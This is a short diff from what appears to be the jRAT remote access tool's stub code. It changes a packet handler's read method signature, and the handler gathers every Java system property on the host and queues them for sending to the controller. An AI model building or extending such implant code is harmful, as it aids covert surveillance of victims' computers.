@@ -9,7 +9,7 @@ import se.jrat.stub.packets.outgoing.Packet32SystemProperties;
 public class Packet90SystemProperties extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		Set<Object> set = System.getProperties().keySet();
 		for (Object str : set) {
 			Connection.instance.addToSendQueue(new Packet32SystemProperties(str.toString(), System.getProperty(str.toString())));
